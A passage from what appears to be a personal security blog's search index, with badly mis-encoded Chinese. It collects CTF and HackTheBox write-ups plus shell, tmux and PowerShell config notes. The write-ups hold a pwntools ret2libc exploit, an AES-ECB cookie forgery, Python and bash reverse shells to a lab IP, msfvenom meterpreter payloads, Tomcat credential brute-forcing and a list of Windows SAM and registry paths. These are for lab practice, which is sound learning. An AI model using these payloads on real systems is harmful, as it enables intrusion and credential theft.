å°±å¯ä»¥å®ç°ä»»æ„è°ƒç”¨äº† libcçš„éƒ¨åˆ†å‚è€ƒç½‘ä¸Šçš„wpä½¿ç”¨äº†LibcSearcheræ¥æ‰¾, å°±å¾ˆé¡ºåˆ©äº†hhh expå¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *from LibcSearcher import *context.log_level = 'debug'context.arch = 'i386'elf = ELF(\"./level3\")sh = 0# lib = ELF(\"./libc-2.19.so\")def exp(ip, port, debug=0): global sh if debug: sh = process(\"./level3\") else: sh = remote(ip, port) # leak write payload = \"a\" * (0x88 + 0x4) payload += p32(elf.plt['write']) payload += p32(0x8048495) # vuln payload += p32(0x1) payload += p32(elf.got['write']) payload += p32(0x4) sh.recvuntil(\"Input:\\n\") sh.send(payload) write_addr = u32(sh.recv(4)) # calc system & /bin/sh lib = LibcSearcher(\"write\", write_addr) image_base = write_addr - lib.dump(\"write\") system_addr = image_base + lib.dump(\"system\") bin_sh_addr = image_base + lib.dump(\"str_bin_sh\") # getshell payload = \"a\" * (0x88 + 0x4) payload += p32(system_addr) payload += p32(0xdeadbeef) payload += p32(bin_sh_addr) sh.recvuntil(\"Input:\\n\") sh.sendline(payload) sh.interactive()if __name__ == '__main__': exp(\"node3.buuoj.cn\", 25297, 0) pwnçš„å¿«ä¹æš‚æ—¶åˆ°è¿™é‡Œäº†, åé¢æœ‰ç©ºå†ç©ä¸€ä¸‹ [BSidesCF 2019]Mixerè¿™é“é¢˜æŒºå·§å¦™çš„, å¦‚æœçœ‹è¿‡WPçš„è¯å¯ä»¥çŸ¥é“è¿™æ˜¯AESçš„ECBç¿»è½¬æ”»å‡» é¦–å…ˆè¦æ‰“å¼€burpçš„è¿™ä¸ªè®¾ç½® è¿™æ ·æ–¹ä¾¿æˆ‘ä»¬è·Ÿéšè·³è½¬è€Œä¸ç”¨æ‰‹åŠ¨è®¾ç½®cookie ç™»å½•åå¯ä»¥çœ‹åˆ°å¤šäº†ä¸€ä¸ªuserçš„cookie, å¹¶ä¸”æç¤ºè¯´ 1And you can safely ignore the rack.session cookie. Like actually. But that other cookie, however.... (ä¸­é—´çœç•¥ä¸€å †æ—¥cookieçš„æ—¶é—´) æˆ‘ä»¬å…ˆéšä¾¿æ”¹ä¸€ä½è¯•è¯• å‘ç°æŠ¥é”™, æ˜¯ä¸€ä¸ªjsonçš„è§£å¯†, ä¹±ç çš„åªæœ‰æˆ‘ä»¬ä¿®æ”¹çš„é‚£ä¸ªå—, å¯ä»¥æ¨æµ‹æ˜¯ECBåŠ å¯†, å¦‚æœæ˜¯CBCçš„è¯, å‰é¢ä¹Ÿä¼šå˜æˆä¹±ç  æˆ‘ä»¬çŸ¥é“ECBåŠ å¯†æ˜¯16ä½ä¸€ç»„, å¹¶ä¸”æ¯ç»„äº’ç›¸ç‹¬ç«‹, åŠ å¯†åä¸º32ä½, è€Œè¿™é‡Œçš„ç›®æ ‡æ˜¯è®©is_adminå˜æˆ1, å•çº¯çš„ç¿»è½¬çš„è¯ä¸å¤ªå¥½æ“ä½œ, æ¯•ç«Ÿæˆ‘ä»¬ä¸çŸ¥é“IV, ä½†æ˜¯åœ¨jsonä¸­ 11.0 = 1 é‚£å¦‚æœæˆ‘ä»¬æ„é€ åˆšå¥½16ä½, ä¹Ÿå°±æ˜¯1.00000000000000, ä½¿å¾—è¿™ä¸ªå—ç‹¬ç«‹åŠ å¯†, ç„¶åå†æ”¾åˆ°is_adminä¸­, å°±å¯ä»¥å°†is_adminå˜æˆ1äº† å…ˆå†™å‡ºjson 1{\"first_name\":\"\",\"last_name\":\"\",\"is_admin\":} è§‚å¯Ÿåˆ°å‰é¢çš„ 1{\"first_name\":\" æ€»å…±15ä½, åŠ ä¸Šä¸€ä½å°±å¯ä»¥å˜æˆ16ä½, å³è¿™æ · 1{\"first_name\":\"A1.00000000000000\",\"last_name\":\"\",\"is_admin\":} å°±å¯ä»¥é¡ºåˆ©è·å–æˆ‘ä»¬éœ€è¦çš„1.00000000000000çš„åŠ å¯†å—äº† å†è§‚å¯Ÿåé¢, ä½¿å¾— 1\",\"last_name\":\"\",\"is_admin\": ä¸º16çš„æ•´æ•°å€, ä¸­é—´éœ€è¦å¡«å……4ä¸ªå­—ç¬¦, ä¹Ÿå°±æ˜¯ 1{\"first_name\":\"A1.00000000000000\",\"last_name\":\"A333\",\"is_admin\":} é‚£ä¹ˆè¿™ä¸ªjsonä¼šè¢«åˆ†ä¸º5ä¸ªéƒ¨åˆ†åŠ å¯† 12345{\"first_name\":\"A1.00000000000000\",\"last_name\":\"A333\",\"is_admin\":} å…¶ä¸­æœ€åä¸€ä¸ªå—ä¼šè¢«å¡«å……åˆ°16ä½, æˆ‘ä»¬é¦–å…ˆå°†ä¸Šé¢çš„jsonä»¥getæ–¹å¼æäº¤ 1/?action=login&first_name=A1.00000000000000&last_name=A333 ç„¶åè·å–cookie 12a3a97a1e1a60d30206bd0710c7d6436c21965416ed467e21d650a0e019b68eff2c3b097feb7610eb39b30a3bddadcd1967867848b5b83d2629292395c9af2835c8ac8596bd3f958383991f95d145726 33-64ä½, æ·»åŠ åˆ°æœ€åçš„32ä½ä¹‹å‰ 12a3a97a1e1a60d30206bd0710c7d6436c21965416ed467e21d650a0e019b68eff2c3b097feb7610eb39b30a3bddadcd1967867848b5b83d2629292395c9af283c21965416ed467e21d650a0e019b68ef5c8ac8596bd3f958383991f95d145726 å°±å¯ä»¥çœ‹åˆ°flagäº† [BSidesCF 2019]Futurella çœ‹åˆ°å¥‡æ€ªçš„ä¸œè¥¿, è¿˜ä»¥ä¸ºæ˜¯åœ¨åšmisc, å®é™…ä¸ŠçœŸçš„æ˜¯misc ç­¾åˆ°é¢˜äº†è§£ä¸€ä¸‹ [BSidesCF 2019]SVGMagicåŸæ¥è¿™é¢˜æ˜¯è¦çœ‹å›¾ç‰‡çš„â€¦ svgå…¶å®å°±æ˜¯xml, æ‰€ä»¥è¿˜æ˜¯xxe, ä¸è¿‡æˆ‘ä¸€ç›´ä»¥ä¸ºè§£ç base64å°±ä¼šçœ‹åˆ°, ç›´åˆ°æˆ‘æ‰“å¼€äº†å›¾ç‰‡hhh åé¢å°±éšä¾¿è¯»äº† [BSidesCF 2019]FlagSrvæœ¬æ–‡ä½œè€…: cjm00næœ¬æ–‡åœ°å€: https://cjm00n.top/2020/02/18/Buuåˆ·é¢˜è®°å½•3/ ç‰ˆæƒå£°æ˜: é™¤ç‰¹åˆ«è¯´æ˜å¤–ï¼Œæ‰€æœ‰æ–‡ç« å‡é‡‡ç”¨ CC BY 4.0 è®¸å¯åè®®ï¼Œè½¬è½½è¯·å…ˆå–å¾—åŒæ„ã€‚","link":"/2020/02/18/Buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/"},{"title":"CSRFå­¦ä¹ ä¹‹æ—…","text":"çœ‹äº† p ç¥çŸ¥è¯†æ˜Ÿçƒæœ€è¿‘å…³äºæ ¡æ‹›çŸ¥è¯†ç‚¹çš„æ•´ç†, äºæ˜¯æƒ³å¯¹ CSRF åšä¸€äº›çŸ¥è¯†æ€§çš„æ€»ç»“å’Œå­¦ä¹  ğŸ˜„ æ›´æ–°ä¸­ é¢˜ç›®CSRF ç›¸å…³çš„å†…å®¹, åŸŸçš„æ¦‚å¿µ, è·¨åŸŸçš„æ–¹æ³•, CSRF é˜²å¾¡çš„å„ç§æ–¹æ³•å¯¹æ¯”, Same_site Cookie æ¦‚å¿µå®æˆ˜å‚è€ƒ å‰ç«¯å®‰å…¨ç³»åˆ—ä¹‹äºŒï¼šå¦‚ä½•é˜²æ­¢ CSRF æ”»å‡» æœ¬æ–‡ä½œè€…: cjm00næœ¬æ–‡åœ°å€: https://cjm00n.top/2020/03/04/CSRFå­¦ä¹ ä¹‹æ—…/ ç‰ˆæƒå£°æ˜: é™¤ç‰¹åˆ«è¯´æ˜å¤–ï¼Œæ‰€æœ‰æ–‡ç« å‡é‡‡ç”¨ CC BY 4.0 è®¸å¯åè®®ï¼Œè½¬è½½è¯·å…ˆå–å¾—åŒæ„ã€‚","link":"/2020/03/04/CSRF%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/"},{"title":"Configæ–‡æ¡£","text":"è®°å½•ä¸‹å¸¸ç”¨çš„é…ç½® git proxyè®© git èµ°ä»£ç†, åŸºæœ¬å¯ä»¥è¾¾åˆ°æ»¡é€Ÿ 1git config --global http.https://github.com.proxy socks5h://127.0.0.1:10808 åˆ é™¤ä»£ç† 1git config --global --unset http.https://github.com.proxy zsh12apt install zshsh -c \"$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\" zshrc12345678910111213# themeZSH_THEME=\"ys\"# aliasalias ctf=\"cd /mnt/hgfs/ctf\"alias tools=\"cd /mnt/hgfs/tools\"alias clash=\"~/clash/clash -d ~/clash/\"alias htbvpn=\"openvpn ~/cjM00N.ovpn\"alias pc=\"proxychains\"alias tmuxa=\"tmux a -t\"alias tmuxn=\"tmux new -s\"alias vi=\"vim\"alias burp=\"/opt/Burpsuite/start.sh\" å†…å¤–ç½‘åˆ‡æ¢12345netstat -nr æŸ¥çœ‹è·¯ç”±è¡¨sudo route delete 0.0.0.0 åˆ é™¤é»˜è®¤è·¯ç”±sudo route add -net 0.0.0.0 192.168.1.1 é»˜è®¤ä½¿ç”¨192.168.1.1ç½‘å…³sudo route add 10.200.0.0 10.200.22.254 æœ‰çº¿ç½‘å¡ä½¿ç”¨è¯¥ç½‘å…³sudo route add 10.0.1.0/24 10.200.22.254 å…¶å®ƒç½‘æ®µæŒ‡å®šç½‘å…³ åˆ‡æ¢ java ç‰ˆæœ¬1update-alternatives --config java tmux é…ç½®123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# reload with Ctrl+rbind C-r source-file ~/.tmux.conf \\; display \"Reloaded!\"# tmux attachnew-session# vi keymapset-option -g status-keys viset-window-option -g mode-keys vi# vi-type selection and copybind -T copy-mode-vi v send-keys -X begin-selectionbind -T copy-mode-vi y send-keys -X copy-selection-and-cancel# choose pane with vi-keybind -r ^k selectp -Ubind -r ^j selectp -Dbind -r ^h selectp -Lbind -r ^l selectp -R# exec command manbind m command-prompt \"splitw -h 'exec man %%'\"# add Ctrl+a to prefix keyset -g prefix2 C-abind C-a send-prefix -2# new pane - =# horizontalunbind '\"'bind - splitw -v -c '#{pane_current_path}'# verticalunbind %bind = splitw -h -c '#{pane_current_path}'# colorset -g default-terminal \"screen-256color\"# renamesetw -g automatic-rename offsetw -g allow-rename off# mouseset -g mouse on# ------ status theme -------------------------------set -g message-style \"bg=#00346e, fg=#ffffd7\" # tomorrow night blue, base3set -g status-style \"bg=#00346e, fg=#ffffd7\" # tomorrow night blue, base3set -g status-left \"#[bg=#0087ff] > #S \" # blueset -g status-left-length 400set -g status-right \"#[bg=#0087ff] #(whoami)@#h #[bg=red] %Y-%m-%d %H:%M \"set -g status-right-length 600set -g set-clipboard onset -g history-limit 8000set -wg window-status-format \" #I #W \"set -wg window-status-current-format \" #I #W \"set -wg window-status-separator \"\"set -wg window-status-current-style \"bg=red\" # redset -wg window-status-last-style \"fg=#dddddd\"set -wg pane-active-border-style \"fg=blue\"set -wg pane-border-style \"fg=#585858\" # base01set -g status-justify left powershell è®¾ç½®åˆ«åæ‰“å¼€é…ç½®æ–‡ä»¶ 1code $PROFILE è®¾ç½®åˆ«åæ ·ä¾‹å¦‚ä¸‹ 1234function cdTools{ Set-Location D:\\tools}Set-Alias tools cdTools é‡å¯ powershell å³å¯å¦‚æœæ˜¯å¸¦å‚æ•°çš„å‘½ä»¤, åˆ™å¯ä»¥é€šè¿‡$argsæ¥è·å–, ä¾‹å¦‚è‡ªåŠ¨æ–°å»ºå¹¶æ‰“å¼€ md 12345function newPost{ cdBlog hexo new \"$args\" code D:\\CTF\\blog\\source\\_post\\$args.md} è¿™é‡Œæ²¡æœ‰å¤„ç†å¯¹äºæ–‡ä»¶åçš„è½¬æ¢é—®é¢˜, æ¯”å¦‚ç©ºæ ¼, ç‰¹æ®Šç¬¦å·ç­‰ æ•´ç†å¦‚ä¸‹ 1234567891011121314151617181920212223242526function cdBlog{ Set-Location D:\\CTF\\blog}function cdTools{ Set-Location D:\\tools}function cdCTF { Set-Location D:\\CTF}function cdDownload { Set-Location D:\\xxx\\Downloads}function exThere { explorer.exe .}function pushBlog { cdBlog hexo clean; hexo d -g;}Set-Alias blog cdBlogSet-Alias tools cdToolsSet-Alias ctf cdCTFSet-Alias down cdDownloadSet-Alias ex exThereSet-Alias hexod pushBlog æœ¬æ–‡ä½œè€…: cjm00næœ¬æ–‡åœ°å€: https://cjm00n.top/2019/10/24/Configæ–‡æ¡£/ ç‰ˆæƒå£°æ˜: é™¤ç‰¹åˆ«è¯´æ˜å¤–ï¼Œæ‰€æœ‰æ–‡ç« å‡é‡‡ç”¨ CC BY 4.0 è®¸å¯åè®®ï¼Œè½¬è½½è¯·å…ˆå–å¾—åŒæ„ã€‚","link":"/2019/10/24/Config%E6%96%87%E6%A1%A3/"},{"title":"HTB-Hackä¹‹æ—…","text":"æˆ‘tcl MachinesBashedéš¾åº¦æ˜¯ctfä¸­çš„ç™½ç»™é¢˜ æ‰“å¼€ç•Œé¢å¦‚ä¸‹ ç‚¹å‡»phpbashåä¼šè·³è½¬åˆ°github, å¯ä»¥çœ‹åˆ°æºç å¦‚ä¸‹ 123456if (ISSET($_POST['cmd'])) { $output = preg_split('/[\\n]/', shell_exec($_POST['cmd'].\" 2>&1\")); foreach ($output as $line) { echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8') . \"\"; } die(); å¯ä»¥çœ‹åˆ°ç›´æ¥å°†å‘½ä»¤ä¼ å…¥shell, ä¸è¿‡æœ‰ä¸ª2>&1, ä¼šä½¿å¾—ä¸€äº›shellå‘½ä»¤ä¸æ‰§è¡Œ è¿™é‡Œæ˜¯æ ¹æ®wpä¸€æ­¥ä¸€æ­¥åšçš„, é¦–å…ˆçœ‹ä¸€ä¸‹nmap 1nmap -sC -sV -oA nmap/init 10.10.10.68 nmapçš„å‘½ä»¤å¯ä»¥å‚è€ƒ https://github.com/erasin/notes/blob/master/linux/safe/nmap.md -sC: ç­‰ä»·äº â€“script=default, ä½¿ç”¨é»˜è®¤ç±»åˆ«çš„è„šæœ¬è¿›è¡Œæ‰«æ -sV: æŒ‡å®šè®©Nmapè¿›è¡Œç‰ˆæœ¬ä¾¦æµ‹ -oA: è¾“å‡ºè‡³æ‰€æœ‰æ ¼å¼ å¯ä»¥çœ‹åˆ°ç»“æœå¦‚ä¸‹ ç„¶åæ¢æµ‹ä¸€ä¸‹ç›®å½• 1gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ç»“æœå¦‚ä¸‹ è®¿é—®ä¸€ä¸‹åˆ†åˆ«å¾—åˆ° 123/dev/phpbash.php/php/sendmail.php/uploads/ (NULL) ç„¶åå¯ä»¥é€šè¿‡phpbashæ¥ç›´æ¥æ‰§è¡Œå‘½ä»¤, é¦–å…ˆä¼ ä¸€ä¸ªLinEnum.shæŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿçš„æ•æ„Ÿä¿¡æ¯ 123456# localpython -m SimpleHTTPServer 8000# remotecd uploadswget http://ip:8000/LinEnum.sh bash LinEnum.sh ç»“æœå¦‚ä¸‹ 12345678910[00;31m[-] Super user account(s):[00mroot[00;33m[+] We can sudo without supplying a password![00mMatching Defaults entries for www-data on bashed: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on bashed: (scriptmanager : scriptmanager) NOPASSWD: ALL çœ‹åˆ°æœ‰ä¸ªæ— å¯†ç çš„è´¦å·scriptmanager é‚£æˆ‘ä»¬å†åå¼¹ä¸ªshell, å¯ä»¥ä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦çš„phpæ–‡ä»¶ 1/usr/share/webshells/php/php-reverse-shell.php ä¿®æ”¹ipå’Œç«¯å£å, åœ¨uploadså†™å…¥ 1wget http://ip:8000/php-reverse-shell.php ç„¶åè®¿é—®å°±å¯ä»¥æ‹¿åˆ°shelläº† å†åˆ©ç”¨é™„å½•çš„å‡çº§æ–¹æ³•å³å¯è·å¾—äº¤äº’shell, ç„¶åç™»å½•è¿›scriptmanager 1su -u scriptmanager bash å¯ä»¥åœ¨/ä¸‹çœ‹åˆ°æœ‰ä¸ªscriptsæ–‡ä»¶å¤¹, è®¿é—®ä¹‹, ä¸‹é¢æœ‰ä¸ªrootæƒé™çš„æ–‡ä»¶ å¦‚æœå¯ä»¥çœ‹åˆ°test.pyçš„åŸå†…å®¹çš„è¯, ä»–å…¶å®æ˜¯ä¿®æ”¹äº†test.txt, è¿™å°±è¯´æ˜test.pyçš„æ‰§è¡Œå…¶å®æ˜¯ç”±rootæ‰§è¡Œçš„, ä½†æ˜¯æˆ‘ä»¬å¯ä»¥å†™, é‚£å°±å°†å†…å®¹æ”¹ä¸ºåå¼¹shell 1234567import socket,subprocess,os,ptys=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((\"ip\",port))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)pty.spawn(\"/bin/bash\") ç„¶åæœ¬åœ°ç›‘å¬å³å¯ 1nc -lvvp 2334 æˆåŠŸè·å–rootæƒé™ Lameé¦–å…ˆè¿›è¡Œå…¨é¢çš„æ‰«æ 1nmap â€“T4 â€“A â€“v targethost -T4: Tè¡¨ç¤ºé€Ÿåº¦(0-5), å€¼è¶Šå¤§åˆ™è¶Šå¿« -v: æ˜¾ç¤ºå†—ä½™ä¿¡æ¯ -A: è¿›æ”»æ€§çš„æ‰«æ æ‰«æç»“æœå¦‚ä¸‹, å¯ä»¥çœ‹åˆ°æœ‰21å’Œ139å’Œ445åº”è¯¥æ˜¯å¯ä»¥æ‰“çš„ å°è¯•äº†ä¸€ä¸‹21ç«¯å£çš„vsftpd 2.3.3è¿˜çœŸçš„æ²¡æ‰“é€šâ€”, wpè¯šä¸æ¬ºæˆ‘ 1explort/unix/ftp/vsftpd_234_backdoor è€è€å®å®è·Ÿç€wpæ‰“ 1234search CVE-2007-2447use exploit/multi/samba/usermap_script set RHOSTS 10.10.10.3run ç„¶åå°±æ˜¯rootäº† Legacyè·Ÿå‰ä¸€é¢˜å¾ˆåƒ, è¿˜æ˜¯nmapå¼€å±€ 1nmap -T2 -A -v -oA nmap/init 10.10.10.3 xpçš„æœºå™¨, å¼€äº†smb, è¿™é‡Œå¯ä»¥ç”¨MS-08-067æ¥æ‰“ ç†æƒ³æ˜¯ä¸°æ»¡çš„, è¿™ä¸€æ­¥æˆ‘å¡äº†å¾ˆä¹…å¾ˆä¹…(å›½å†…ç½‘ç»œå¤ªå·®äº†) Jerry1nmap -sC -sV -oA nmap/init 10.10.10.95 8080å¼€æ”¾, è®¿é—®å®ƒ, gogo å¯ä»¥çœ‹åˆ°æ˜¯é»˜è®¤çš„tomcaté¡µé¢, æœ‰ä¸‰ä¸ªé€‰é¡¹ server status: admin:adminå¯ä»¥ç›´æ¥è®¿é—®, ä½†æ˜¯æ²¡å•¥ç”¨, æŸ¥çœ‹å¦å¤–ä¸¤ä¸ª, adminæ— æ³•ç™»é™†, ä½¿ç”¨hydraçˆ†ç ´ è¿™é‡Œå…¶å®è´¦å·å’Œå¯†ç éƒ½æ˜¯æ˜æ–‡çš„, ä½†æ˜¯ä¸€èˆ¬è¿˜æ˜¯ä¸ä¼šç›´æ¥ç»™å‡ºçš„, æ‰€ä»¥è¿™é‡Œè¿˜æ˜¯æŒ‰ç…§wpçš„æ­¥éª¤çˆ†ç ´ 12apt install seclistshydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html admin:adminä¸æˆåŠŸ, ä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥hydraç»™å‡ºæ¥äº†, æˆ‘ä»¬è¿™é‡Œä½¿ç”¨tomcat:s3cretç™»å½• ç™»å½•è¿›æ¥åæœ‰äº†éƒ¨ç½²æƒ, å¯ä»¥ä¼ jspé©¬æ¥getshell é¦–å…ˆä½¿ç”¨msfvenomåˆ›å»ºä¸€ä¸ªåå¼¹shellçš„waré©¬ 1msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.12.10 LPORT=2334 -f war -o jerry.war ç„¶åæŸ¥çœ‹ä¸€ä¸‹åŒ…é‡Œé¢çš„jspæ–‡ä»¶åœ°å€ 12mkdir tmpcd tmp && unzip ../jerry.war å†éƒ¨ç½²åˆ°tomcatä¸Šé¢, æœ¬åœ°msfç›‘å¬ä¸€ä¸‹ 123456msfdb runuse exploit/multi/handlerset payload windows/x64/meterpreter/reverse_tcpset LHOST tun0set LPORT 2334run # run -j åå°å¯åŠ¨ è®¿é—®tomcatä¸Šé¢çš„åœ°å€, å°±å¯ä»¥åœ¨æœ¬åœ°æ¥åˆ°shelläº†, ä¸‹é¢æ˜¯flag ippsecçš„è§†é¢‘åšçš„çœŸçš„å¥½, å¼ºçƒˆå»ºè®®çœ‹ä¸€çœ‹ Netmon1nmap -sC -sV -oA nmap/init 10.10.10.152 å¯ä»¥çœ‹åˆ°æœ‰ftpæœåŠ¡, è¿ä¸Šå»åº·åº· 123ftp 10.10.10.152# user: Anonymous# pwd: Anonymous ç™»å½•ä¹‹åå¯ä»¥æ‹¿åˆ°ç”¨æˆ·çš„flag ç»§ç»­è¿›è¡Œä¿¡æ¯æœé›†, æˆ‘ä»¬å¯ä»¥æ ¹æ®ä¸‹é¢çš„å­—å…¸è¿›è¡Œæ¢æµ‹ https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768C:/Users/Administrator/NTUser.datC:/Documents and Settings/Administrator/NTUser.datC:/apache/logs/access.logC:/apache/logs/error.logC:/apache/php/php.iniC:/boot.iniC:/inetpub/wwwroot/global.asaC:/MySQL/data/hostname.errC:/MySQL/data/mysql.errC:/MySQL/data/mysql.logC:/MySQL/my.cnfC:/MySQL/my.iniC:/php4/php.iniC:/php5/php.iniC:/php/php.iniC:/Program Files/Apache Group/Apache2/conf/httpd.confC:/Program Files/Apache Group/Apache/conf/httpd.confC:/Program Files/Apache Group/Apache/logs/access.logC:/Program Files/Apache Group/Apache/logs/error.logC:/Program Files/FileZilla Server/FileZilla Server.xmlC:/Program Files/MySQL/data/hostname.errC:/Program Files/MySQL/data/mysql-bin.logC:/Program Files/MySQL/data/mysql.errC:/Program Files/MySQL/data/mysql.logC:/Program Files/MySQL/my.iniC:/Program Files/MySQL/my.cnfC:/Program Files/MySQL/MySQL Server 5.0/data/hostname.errC:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.logC:/Program Files/MySQL/MySQL Server 5.0/data/mysql.errC:/Program Files/MySQL/MySQL Server 5.0/data/mysql.logC:/Program Files/MySQL/MySQL Server 5.0/my.cnfC:/Program Files/MySQL/MySQL Server 5.0/my.iniC:/Program Files (x86)/Apache Group/Apache2/conf/httpd.confC:/Program Files (x86)/Apache Group/Apache/conf/httpd.confC:/Program Files (x86)/Apache Group/Apache/conf/access.logC:/Program Files (x86)/Apache Group/Apache/conf/error.logC:/Program Files (x86)/FileZilla Server/FileZilla Server.xmlC:/Program Files (x86)/xampp/apache/conf/httpd.confC:/WINDOWS/php.iniC:/WINDOWS/Repair/SAMC:/Windows/repair/systemC:/Windows/repair/softwareC:/Windows/repair/securityC:/WINDOWS/System32/drivers/etc/hostsC:/Windows/win.iniC:/WINNT/php.iniC:/WINNT/win.iniC:/xampp/apache/bin/php.iniC:/xampp/apache/logs/access.logC:/xampp/apache/logs/error.logC:/Windows/Panther/Unattend/Unattended.xmlC:/Windows/Panther/Unattended.xmlC:/Windows/debug/NetSetup.logC:/Windows/system32/config/AppEvent.EvtC:/Windows/system32/config/SecEvent.EvtC:/Windows/system32/config/default.savC:/Windows/system32/config/security.savC:/Windows/system32/config/software.savC:/Windows/system32/config/system.savC:/Windows/system32/config/regback/defaultC:/Windows/system32/config/regback/samC:/Windows/system32/config/regback/securityC:/Windows/system32/config/regback/systemC:/Windows/system32/config/regback/softwareC:/Program Files/MySQL/MySQL Server 5.1/my.iniC:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xmlC:/Windows/System32/inetsrv/config/applicationHost.configC:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log æ¥ä¸‹æ¥éœ€è¦è·å–rootæƒé™, å…ˆç¦»å¼€ftpçœ‹çœ‹å…¶ä»–çš„ç«¯å£, ä¸ªäººä¿¡æ¯1234# ip10.10.14.10# bashbash -i >& /dev/tcp/10.10.14.10/2333 0>&1 äº¤äº’å¼shellåŠäº¤äº’å¼12# python ptypython -c 'import pty;pty.spawn(\"/bin/bash\")' æ­¤æ—¶å¯ä»¥å®ç°ç®€å•çš„äº¤äº’, å¤„äºåŠäº¤äº’çŠ¶æ€, ä½†æ˜¯ä¸èƒ½ç”¨vimè¿™ç§å‘½ä»¤ äº¤äº’å¼é¦–å…ˆå°†shellæ”¾åˆ°åå° 1ctrl + z ç„¶åæ‰§è¡Œ 1stty raw -echo æ¥ç€ä½¿ç”¨fgå°†shellè¿”å›å‰å° 1fg ç°åœ¨çš„shellçœ‹èµ·æ¥ä¼šæ¯”è¾ƒå¥‡æ€ª, ä½¿ç”¨reset 1reset å†å¯¼å…¥å¦‚ä¸‹é…ç½®å³å¯ 123export SHELL=bashexport TERM=xterm256-colorstty rows 24 columns 80 åæ§½ä¸€ä¸‹ä¸ºå•¥è¿›å…¥äº¤äº’å¼åshellç‰¹åˆ«å¡â€”- å‚è€ƒèµ„æ–™ https://bbs.ichunqiu.com/thread-54982-1-1.html æœ¬æ–‡ä½œè€…: cjm00næœ¬æ–‡åœ°å€: https://cjm00n.top/2019/11/24/HTB-Hackä¹‹æ—…/ ç‰ˆæƒå£°æ˜: é™¤ç‰¹åˆ«è¯´æ˜å¤–ï¼Œæ‰€æœ‰æ–‡ç« å‡é‡‡ç”¨ CC BY 4.0 è®¸å¯åè®®ï¼Œè½¬è½½è¯·å…ˆå–å¾—åŒæ„ã€‚","link":"/2019/11/24/HTB-Hack%E4%B9%8B%E6%97%85/"},{"title":"Minosä¸»é¢˜ä¿®æ”¹æŒ‡å—","text":"å¯¹ç°åœ¨ä½¿ç”¨çš„Minosä¸»é¢˜åšäº†äº›ä¿®æ”¹, åšä¸€ä¸‹è®°å½• æç¼“æ…¢æ›´æ–° Tagsé¡µé¢ä¿®æ”¹æ‰“å¼€ä¸‹é¢çš„æ–‡ä»¶ 1theme/minos/layout/tags.ejs ç¬¬4è¡Œä¿®æ”¹ä¸º tags.ejs1 ç¬¬13è¡Œå»æ‰# 1&nbsp;() æ•ˆæœå¦‚ä¸‹ ç‰ˆæƒå£°æ˜ä½¿ç”¨çš„æ˜¯ 1hexo-addlink æ’ä»¶, å®‰è£…ååœ¨æ ¹ç›®å½•çš„ _config.xml ä¸­åŠ å…¥ _config.xml123addlink: before_text: \"{% colorquote info %}æœ¬æ–‡ä½œè€…ï¼šauthoræœ¬æ–‡åœ°å€ï¼š\" after_text: \"ç‰ˆæƒå£°æ˜ï¼šé™¤ç‰¹åˆ«è¯´æ˜å¤–ï¼Œæ‰€æœ‰æ–‡ç« å‡é‡‡ç”¨ CC BY 4.0 è®¸å¯åè®®ï¼Œè½¬è½½è¯·å…ˆå–å¾—åŒæ„ã€‚{% endcolorquote %}\" æ•ˆæœå¦‚ä¸‹ è¿™é‡Œä½¿ç”¨äº† hexo-tag æ’ä»¶ä¼˜åŒ–å¼•ç”¨æ•ˆæœ, ä¸éœ€è¦åˆ é™¤å¤§æ‹¬å·å†…å®¹å³å¯ hexo-tagè¿™é‡Œä¸»è¦æ˜¯å±•ç¤ºä¸€ä¸‹æ•ˆæœ, æ–¹ä¾¿è¦ç”¨çš„æ—¶å€™å¯ä»¥è°ƒç”¨, å…·ä½“å¯ä»¥çœ‹ä¸»é¢˜ä½œè€…çš„ä½¿ç”¨è¯´æ˜ https://blog.zhangruipeng.me/hexo-theme-minos/Using-Hexo-Tag-Plugins-in-Minos/ 123{% colorquote [type] %}text {% endcolorquote %} This is info text This is success text This is warning text This is danger text å›ºå®šå¯¼èˆªæ åœ¨å¤šçº§ç•Œé¢çš„æ—¶å€™, æ„Ÿè§‰è¿˜æ˜¯å›ºå®šå¯¼èˆªæ æ›´å®ç”¨, æˆ‘çš„åšæ³•æ¯”è¾ƒç²—æš´ 1theme/minos/source/js/script.js ç¬¬18è¡Œ, æ³¨é‡Šå®šæ—¶å™¨å³å¯ 123456// setInterval(function() { // if (didScroll) { // hasScrolled(); // didScroll = false; // } // }, 250); æ•ˆæœå°±æ˜¯ä¸ä¼šæ¶ˆå¤±äº†hhhh æ–‡ç« è®¿é—®è®¡æ•°ä½¿ç”¨çš„æ˜¯ä¸è’œå­çš„è®¡æ•°, æ²¡æœ‰åšä»€ä¹ˆæ•ˆæœ, ç›´æ¥å¼•å…¥ 1theme/minos/layout/footer.ejs ç¬¬10è¡Œåæ’å…¥ footer.ejs1234567 clicked: times é¡ºä¾¿æ”¹äº†å‰é¢çš„æç¤ºå­—ç¬¦, åœ¨ç¬¬äº”è¡Œ footer.ejs1 &nbsp; æ•ˆæœå¦‚ä¸‹ RSSä½¿ç”¨çš„æ˜¯ 1hexo-generator-feed åŒæ ·å®‰è£…ååœ¨æ ¹ç›®å½•çš„ 1_config.xml æ·»åŠ ä¸‹é¢çš„å†…å®¹ 